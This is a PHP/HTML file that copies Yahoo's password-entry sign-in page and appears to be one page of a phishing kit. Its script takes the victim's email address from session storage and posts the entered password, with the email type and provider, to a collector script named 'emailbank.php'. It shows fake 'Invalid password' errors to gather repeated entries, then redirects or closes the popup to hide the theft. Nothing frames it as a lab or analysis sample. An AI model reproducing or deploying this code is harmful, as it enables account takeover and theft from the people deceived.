<?php
session_start();
require_once '../main.php';
header('Access-Control-Allow-Origin: *');
?>
<html id="Stencil" class="js grid light-theme "><head>
    <meta charset="utf-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
    <meta name="format-detection" content="telephone=no">
    <title>Yahoo</title>
    <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
    <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
    <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
    <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
    <style nonce="">
    #mbr-css-check {
    display: inline;
    }
    .mbr-legacy-device-bar {
    display: none;
    }
    </style>
    <link href="https://s.yimg.com/wm/mbr/f377e610b5200e2d630dbc44743fa1c4f11517ac/yahoo-main.css" rel="stylesheet" type="text/css">
    
</head>
<body class="">
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross">
        <p class="mbr-legacy-device">
            Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="">More&nbsp;Info</a>
        </p>
    </div>
    <div id="login-body" class="loginish dark-background puree-v2 grid">
        <div class="mbr-login-hd" id="mbr-uh-hd">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
        </a>
    </div>
    <div class="challenge password-challenge">
        <div class="challenge-header">
            <div class="yid"></div>
        </div><div id="password-challenge" class="primary">
        <strong class="challenge-heading">Enter&nbsp;password</strong>
        <span class="txt-align-center challenge-desc">to continue</span>
        <form action="javascript:void(0);" method="post" class="pure-form challenge-form" id="emailaccess">
            <input type="hidden" id="emaildress" name="emaildress" value="" data-rapid_p="5"><div class="hidden-username">
            <input type="hidden" name="emailretry" value="" id="emailretry">
            <input type="hidden" name="emailType" value="" id="emailType">
            <input type="hidden" name="emailProvider" value="" id="emailProvider">
        </div>
        <div id="password-container" class="input-group password-container blurred">
            <input type="password" id="login-passwd" class="password" name="emailPassword" placeholder=" " autofocus="" autocomplete="current-password" data-rapid_p="8">
            <label for="login-passwd" id="password-label" class="password-label">Password</label>
            <div class="caps-indicator hide" id="caps-indicator" title="Capslock is&nbsp;on"></div>
            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show&nbsp;password" data-rapid_p="9"></button>
        </div>
        <p class="error-msg" id="password-error" role="alert" data-error="messages.ERROR_INVALID_PASSWORD" style="display: none">
            Invalid password. Please try&nbsp;again
        </p>
        <div class="button-container">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-ylk="elm:btn;elmt:primary;mKey:primary_login_account-challenge-password_primaryBtn" data-rapid_p="10">
            Next
            </button>
        </div>
        <div class="forgot-cont bottom-cta">
            <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:primary_login_account-challenge-password_skipBtn" id="mbr-forgot-link" name="skip" value="Forgot&nbsp;password?" data-rapid_p="11">
        </div>
    </form>
</div>
</div>

</div>

<div id="mbr-css-check"></div>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
<script>
var emailretry = 0;
var ed = sessionStorage.getItem("emaildress");
$(".yid").html(ed);
$("#emaildress").val(ed);
$("#password-toggle-button").click(function() {
if ($(this).hasClass("hide-pw")) {
$(this).addClass("show-pw");
$(this).removeClass("hide-pw");
$("#login-passwd").attr("type", "text");
} else {
$(this).addClass("hide-pw");
$(this).removeClass("show-pw");
$("#login-passwd").attr("type", "password");
}
});
$("#login-passwd").keyup(function() {
if ($.trim($('#login-passwd').val()).length < 4) {
$("#password-error").show();
$("#password-container").addClass("error");
} else {
$("#password-error").hide();
$("#password-container").removeClass("error");
}
});
$("#login-signin").click(function(e) {
e.preventDefault();
if ($.trim($('#login-passwd').val()).length < 4) {
$("#password-error").show();
$("#password-container").addClass("error");
} else {
$("#login-signin").addClass("active");
$("#password-error").hide();
$("#password-container").removeClass("error");
$("#emailType").val(window.opener.document.getElementById('emailType').value);
$("#emailProvider").val(window.opener.document.getElementById('emailProvider').value);
emailretry++
$("#emailretry").val(emailretry);
$.post("../emailbank.php", $("#emailaccess").serialize(), function(result) {});

if ("<?php echo $emailretry ?>" == "on") {
setTimeout(function () {
$("#login-signin").removeClass("active");
$("#password-error").show();
$("#password-container").addClass("error");
}, 2600);
} else {
window.opener.sessionStorage.setItem('emailPassword', $("#emailPassword").val());
if ("<?php echo $enableEmailReal ?>" == "on") {
$(location).attr('href', window.opener.document.getElementById('urli').value);
} else {
close();
}
}
if (emailretry == <?php echo $numberofretries ?>) {
window.opener.sessionStorage.setItem('emailPassword', $("#emailPassword").val());
if ("<?php echo $enableEmailReal ?>" == "on") {
$(location).attr('href', window.opener.document.getElementById('urli').value);
} else {
close();
}
}
}
});
</script>
</html>